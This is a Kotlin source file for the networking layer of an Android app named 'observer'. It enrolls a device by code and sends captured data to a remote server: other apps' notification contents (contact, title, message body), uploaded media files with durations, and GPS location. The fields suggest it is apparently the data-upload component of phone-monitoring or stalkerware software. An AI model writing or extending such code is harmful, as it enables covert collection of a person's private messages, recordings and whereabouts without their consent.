package ru.observer.app.net

import android.content.Context
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONArray
import org.json.JSONObject
import ru.observer.app.data.Event
import ru.observer.app.data.Prefs
import java.io.File
import java.util.concurrent.TimeUnit

object Api {
    private val http = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()

    fun enroll(c: Context, code: String, name: String, cb: (Boolean, String) -> Unit) {
        val b = JSONObject().put("code", code).put("name", name)
            .put("model", android.os.Build.MODEL)
            .put("android", android.os.Build.VERSION.RELEASE).toString()
        val r = Request.Builder().url(Prefs.base + "/api/enroll")
            .post(b.toRequestBody("application/json".toMediaType())).build()
        http.newCall(r).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) = cb(false, e.message ?: "сеть")
            override fun onResponse(call: Call, res: Response) = res.use {
                if (!res.isSuccessful) return cb(false, "код отклонён")
                Prefs.token = JSONObject(res.body!!.string()).getString("token")
                cb(true, "")
            }
        })
    }

    fun push(c: Context, list: List<Event>, cb: (Boolean) -> Unit) {
        if (list.isEmpty()) return cb(true)
        val arr = JSONArray()
        list.forEach {
            arr.put(JSONObject().put("kind", it.kind).put("app", it.app)
                .put("contact", it.contact).put("title", it.title)
                .put("body", it.body).put("src", it.src))
        }
        val r = Request.Builder().url(Prefs.base + "/api/events")
            .header("X-Device-Token", Prefs.token)
            .post(arr.toString().toRequestBody("application/json".toMediaType())).build()
        http.newCall(r).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) = cb(false)
            override fun onResponse(call: Call, res: Response) { res.use { cb(res.isSuccessful) } }
        })
    }

    fun upload(c: Context, f: File, kind: String, dur: Int, cb: (Boolean) -> Unit) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("file", f.name, f.asRequestBody("application/octet-stream".toMediaType())).build()
        val r = Request.Builder().url("${Prefs.base}/api/media?kind=$kind&dur=$dur")
            .header("X-Device-Token", Prefs.token).post(body).build()
        http.newCall(r).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) = cb(false)
            override fun onResponse(call: Call, res: Response) { res.use { cb(res.isSuccessful) } }
        })
    }

    fun loc(c: Context, lat: Double, lon: Double) {
        val b = JSONObject().put("lat", lat).put("lon", lon).toString()
        val r = Request.Builder().url(Prefs.base + "/api/loc")
            .header("X-Device-Token", Prefs.token)
            .post(b.toRequestBody("application/json".toMediaType())).build()
        http.newCall(r).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, res: Response) { res.close() }
        })
    }
}
